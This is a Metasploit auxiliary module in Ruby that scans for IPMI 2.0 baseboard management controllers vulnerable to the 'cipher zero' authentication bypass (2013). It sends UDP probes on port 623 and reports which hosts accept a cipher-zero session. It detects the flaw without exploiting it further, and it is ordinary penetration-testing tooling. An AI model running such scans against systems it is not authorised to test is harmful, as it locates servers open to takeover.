##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##


require 'msf/core'
require 'rex/proto/ipmi'

class Metasploit3 < Msf::Auxiliary

	include Msf::Auxiliary::Report
	include Msf::Auxiliary::Scanner

	def initialize
		super(
			'Name'        => 'IPMI 2.0 RAKP Cipher Zero Authentication Bypass Scanner',
			'Description' => %q|
				This module identifies IPMI 2.0 compatible systems that are vulnerable
				to an authentication bypass vulnerability through the use of cipher 
				zero. 
				|,
			'Author'      => [ 'Dan Farmer <zen[at]fish2.com>', 'hdm' ],
			'License'     => MSF_LICENSE,
			'References'  => 
				[
					['URL', 'http://fish2.com/ipmi/cipherzero.html'],
					['OSVDB', '93038'],
					['OSVDB', '93039'],
					['OSVDB', '93040'],

				],
			'DisclosureDate' => 'Jun 20 2013'
		)

		register_options(
		[
			Opt::RPORT(623)
		], self.class)

	end

	def run_host(ip)

		vprint_status("Sending IPMI probes to #{ip}")

		self.udp_sock = Rex::Socket::Udp.create({'Context' => {'Msf' => framework, 'MsfExploit' => self}})
		add_socket(self.udp_sock)
		udp_send(Rex::Proto::IPMI::Utils.create_ipmi_getchannel_probe)
		r = udp_recv(5.0)

		unless r
			vprint_status("#{rhost} No response to IPMI probe")
			return
		end
		
		info = process_getchannel_reply(*r)
		unless info
			vprint_status("#{rhost} Could not understand the response to the IPMI probe")
			return
		end

		unless info.ipmi_compat_20 == 1
			vprint_status("#{rhost} Does not support IPMI 2.0")
			return
		end

		console_session_id = Rex::Text.rand_text(4)
		console_random_id  = Rex::Text.rand_text(16)

		r = nil
		1.upto(3) do
			udp_send(Rex::Proto::IPMI::Utils.create_ipmi_session_open_cipher_zero_request(console_session_id))
			r = udp_recv(5.0)
			break if r
		end

		unless r
			vprint_status("#{rhost} No response to IPMI open session request")
			return
		end
		
		sess = process_opensession_reply(*r)
		unless sess
			vprint_status("#{rhost} Could not understand the response to the open session request")
			return
		end

		print_status("#{rhost} session reply: #{sess.inspect}")
		if sess.error_code == 0
			print_good("#{rhost} Accepted a session open request for cipher zero")
			# TODO:
			# Report this as a vulnerability
		else
			vprint_status("#{rhost} Rejected cipher zero with error code #{sess.error_code}")
		end

	end

	def process_getchannel_reply(data, shost, sport)
		shost = shost.sub(/^::ffff:/, '')
		info = Rex::Proto::IPMI::Channel_Auth_Reply.new(data) rescue nil

		# Ignore invalid responses
		return if not info
		return if not info.ipmi_command == 56

		banner = info.to_banner

		print_status("#{shost} #{banner}")

		report_service(
			:host  => rhost,
			:port  => rport,
			:proto => 'udp',
			:name  => 'ipmi',
			:info  => banner
		)

		# TODO:
		# Report a vulnerablity if info.ipmi_user_anonymous has been set
		# Report a vulnerability if ipmi 2.0 and kg is set to default
		# Report a vulnerability if info.ipmi_user_null has been set (null username)

		info
	end

	def process_opensession_reply(data, shost, sport)
		shost = shost.sub(/^::ffff:/, '')
		info = Rex::Proto::IPMI::Open_Session_Reply.new(data) rescue nil
		return if not info
		return if not info.session_payload_type == Rex::Proto::IPMI::PAYLOAD_RMCPPLUSOPEN_REP
		info
	end

	def process_rakp1_reply(data, shost, sport)
		shost = shost.sub(/^::ffff:/, '')
		info = Rex::Proto::IPMI::RAKP2.new(data) rescue nil
		return if not info
		return if not info.session_payload_type == Rex::Proto::IPMI::PAYLOAD_RAKP2
		info
	end

	def setup
		super
		@output = nil
		if datastore['OUTPUT_FILE']
			@output = ::File.open(datastore['OUTPUT_FILE'], "ab")
		end
	end

	def cleanup
		super
		@output.close if @output
		@output = nil
	end

	#
	# Helper methods (these didn't quite fit with existing mixins)
	#

	attr_accessor :udp_sock

	def udp_send(data)
		begin
			udp_sock.sendto(data, rhost, datastore['RPORT'], 0)
		rescue ::Interrupt
			raise $!
		rescue ::Exception
		end
	end

	def udp_recv(timeo)
		r = udp_sock.recvfrom(65535, timeo)
		r[1] ? r : nil
	end

	def rhost
		datastore['RHOST']
	end

	def rport
		datastore['RPORT']
	end	

end
